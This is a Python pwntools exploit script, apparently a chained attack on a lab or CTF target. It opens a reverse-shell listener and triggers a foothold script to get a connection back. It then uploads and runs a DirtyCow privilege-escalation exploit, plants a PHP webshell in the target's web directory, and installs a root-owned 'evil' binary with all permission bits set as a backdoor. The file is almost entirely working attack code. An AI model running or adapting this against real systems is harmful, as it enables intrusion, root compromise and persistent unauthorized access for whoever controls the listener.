#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
import subprocess
import os
import argparse

def main(r_ip, php_code, l_ip, l_port, skip_dirty):
    # Listen the reverse shell
    if skip_dirty is None:
        l = listen(l_port)
        # Launch the reverse shell in background
        p = subprocess.Popen(["python2.7", os.path.dirname(os.path.abspath(__file__))+"/foothold.py", "-I", r_ip, "-F", php_code, "-R", l_ip, "-P", l_port], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
        l.wait_for_connection()
        # Send dirty cow exploit code
        with open(os.path.dirname(os.path.abspath(__file__))+'/c0w.c', 'r') as file:
            content = file.read()
            l.sendline(b"cat > c0w.c << EOF")
            l.sendline(str.encode(content.replace('`', '\`').replace('$', '\$'))) 
            l.sendline(b"EOF")
            file.close()

        # Compile the exploit
        l.sendline(b"gcc c0w.c -o c0w -pthread -lcrypt")
        l.sendline(b"./c0w")
        p = log.progress('Waiting 3 minutess for DirtyCow ...')
        time.sleep(180)
        p.success('DirtyCow OK')
        l.close()

    # Listen the reverse shell
    l = listen(l_port)
    # Launch the reverse shell in background
    p = subprocess.Popen(["python2.7", os.path.dirname(os.path.abspath(__file__))+"/foothold.py", "-I", r_ip, "-F", php_code, "-R", l_ip, "-P", l_port], stdout=subprocess.PIPE, stderr=subprocess.STDOUT);
    l.wait_for_connection()
    with open(os.path.dirname(os.path.abspath(__file__))+'/webshell.php', 'r') as file:
        content = file.read()
        l.sendline(b"cat > /var/www/forum/templates_c/webshell.php << EOF")
        l.sendline(str.encode(content.replace('`', '\`').replace('$', '\$'))) 
        l.sendline(b"EOF")
        file.close()
    time.sleep(2)
    p = log.success('Webshell installed')
    time.sleep(2)
    l.sendline(b"/usr/bin/passwd")
    time.sleep(2)
    l.sendline(b"su -")
    time.sleep(2)

    with open(os.path.dirname(os.path.abspath(__file__))+'/evil.c', 'r') as file:
        content = file.read()
        l.sendline(b"cat > /usr/bin/evil.c << EOF")
        l.sendline(str.encode(content.replace('`', '\`').replace('$', '\$'))) 
        l.sendline(b"EOF")
        file.close()   
    time.sleep(2)
    l.sendline(b"gcc /usr/bin/evil.c -o /usr/bin/evil")
    time.sleep(2)
    l.sendline(b"chown root:root /usr/bin/evil && chmod 7777 /usr/bin/evil")
    p = log.success('Evil binary compiled and installed')
    p = log.success('You can now use the webshell at https://'+r_ip+'/forum/templates_c/webshell.php')
    time.sleep(2)



if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-I', '--remote_ip', required=True)
    parser.add_argument('-F', '--php_filename', required=True)
    parser.add_argument('-R', '--local_ip', required=True)
    parser.add_argument('-P', '--local_port', required=True)
    parser.add_argument('-S', '--skip_dirty', required=False)
    args = parser.parse_args()
    sys.exit(main(args.remote_ip, args.php_filename, args.local_ip, args.local_port, args.skip_dirty))